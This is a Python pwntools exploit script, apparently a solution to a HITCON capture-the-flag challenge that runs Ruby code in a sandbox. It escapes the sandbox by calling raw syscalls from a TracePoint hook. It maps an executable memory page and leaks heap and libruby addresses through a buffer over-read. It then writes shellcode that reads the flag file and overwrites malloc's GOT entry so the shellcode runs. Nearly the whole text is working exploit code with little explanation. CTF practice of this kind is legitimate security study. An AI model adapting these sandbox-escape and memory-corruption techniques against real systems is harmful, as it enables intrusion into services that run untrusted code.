#!/home/gym/.venvs/ctf/bin/python2
import os
import sys
from pwn import *
c = None
m = None

REMOTE = True
#REMOTE = False

def main():
    #hitcon{y0u_4re_4_ruby_exp3rt!!=^o_v_o^=}
    c.recvuntil('real> ')

    # allocate RWX page
    create_map(0x2000)
    # get its address
    mmap = send_command('puts "#{$addr}"')
    print mmap
    if REMOTE:
        mmap = int(mmap.split('\n')[1])
    else:
        mmap = int(mmap.split('\n')[0])
    print hex(mmap)
    # just trying to read write to address (accidentally was left here)
    run_unsandboxed('syscall(0,0,$addr, 6)',does_read=True, data_to_send="123456\n")
    run_unsandboxed('syscall(1,1,$addr, 6)')

    # overread buffer, leak addresses
    dump = run_unsandboxed('syscall(1,1,"hello\\n", 100)')
    #print hexdump(dump)
    if REMOTE:
        heap_addr = u64(dump[0xc4:0xcc].ljust(8, '\x00'))
        libruby_addr = u64(dump[0xcc:0xd4].ljust(8, '\x00'))
    else:
        heap_addr = u64(dump[0x58:0x60].ljust(8, '\x00'))
        libruby_addr = u64(dump[0x60:0x68].ljust(8, '\x00'))
    libruby_base = libruby_addr - 0x468cc0
    print hex(heap_addr)
    print hex(libruby_base)

    # create shellcode and write it on rwx page
    shell = asm("mov rbx, "+hex(mmap+0x1000)+"; mov rcx, 0; mov rax, 5; int 0x80;")
    shell += asm("mov rdi, rax; mov rsi, "+hex(mmap+0x1000)+"; mov rdx, 100; mov rax, 0; syscall;")
    shell += asm("mov rdi, 1; mov rsi, "+hex(mmap+0x1000)+"; mov rdx, 100; mov rax, 1; syscall;")
    #shell += asm(" push rax; mov rdi, 1; mov rsi, rsp; mov rdx, 8; mov rax, 1; syscall; pop rax;")
    shell += asm("mov rdx, 0; mov rax, 60; syscall;")
    #payload = "\xcc"+shell
    payload = shell

    # send shellcode
    run_unsandboxed('syscall(0,0,'+hex(mmap)+', '+str(len(payload))+')',does_read=True, data_to_send=payload+'\n')
    # write file path
    path="flag\x00"
    run_unsandboxed('syscall(0,0,'+hex(mmap+0x1000)+', '+str(len(path))+')',does_read=True, data_to_send=path+'\n')


    libruby_malloc = libruby_base + 0x046db08
    libpage = libruby_malloc & 0xfffffffffffff000
    # make libruby got writable (mprotect)
    run_unsandboxed('syscall(10, '+hex(libpage)+',0x1000,3)')
    # read malloc address (not needed)
    libc = run_unsandboxed('syscall(1,1,'+hex(libruby_malloc)+', 8)')
    # overwrite malloc address in got (triggers the malloc as well)
    run_unsandboxed('syscall(0,0,'+hex(libruby_malloc)+', 8)',does_read=True, data_to_send=p64(mmap)+'\n', interactive=True)

def send_command(ruby, interactive=False):
    c.sendline(ruby)
    if interactive:
        c.interactive()
    return c.recvuntil('real> ')

def run_unsandboxed(ruby, does_read=False, data_to_send=None, interactive=False):
    resp = send_command('$f = false')
    cmd = 'x = TracePoint.new(:line){ ('+ruby+') unless $f; $f = true };'
    resp += send_command(cmd)
    c.sendline('x.enable')
    if does_read:
        c.send(data_to_send)
        if interactive:
            c.interactive()
        resp+= c.recvuntil('real> ')

    resp+= c.recvuntil('real> ')
    resp += send_command('x.disable')
    return resp


def send_write():
    return run_unsandboxed('syscall(1,1,"hello\\n", 6)')

def read_to_data(data):
    resp = send_command('$data = " "*%d'%(len(data)))
    resp += run_unsandboxed('syscall(0,0,$data,%d)'%(len(data)), does_read=True, data_to_send=data)
    return resp

def create_file(fname):
    resp = send_command('$fd = 0')
    resp += run_unsandboxed("$fd = syscall(85,'%s', 0xFFFF)"%(fname))
    return resp

def create_map(size):
    resp = send_command('$addr = 0')
    resp += run_unsandboxed("$addr = syscall(9, 0x100000, %d, 7, 0x4000032, -1, 0)"%(size))
    return resp

gdbs=[
    'c'
        ]
bp =[

        ]
if __name__ == "__main__":
    sys.path.append(os.path.expanduser('~/ctf/magicpwn'))
    try:
        from magicpwn import Magic
        # target: vm/native/remote
        # libc: vm/native/remote
        # config: path to config file
        # debug: gdb/villoc/gdbv/none
        #m = Magic('vm', 'gdb', aslr=False, libc='local')
        if not REMOTE:
            m = Magic('vm', 'gdb', aslr=True, libc='local')
            #m = Magic('vm', 'none', aslr=True, libc='local')
        #m = Magic('native', 'villoc', aslr=False, libc='local')
        else:
            m = Magic('remote', 'none', libc='remote')
        #context.log_level = "debug"
        c = m.start(cmds=gdbs, bp=bp, ida=False, ccmd=['/usr/bin/ruby', '/ctf/server.rb'])
    except ImportError:
        c = process("./chall")

    main()
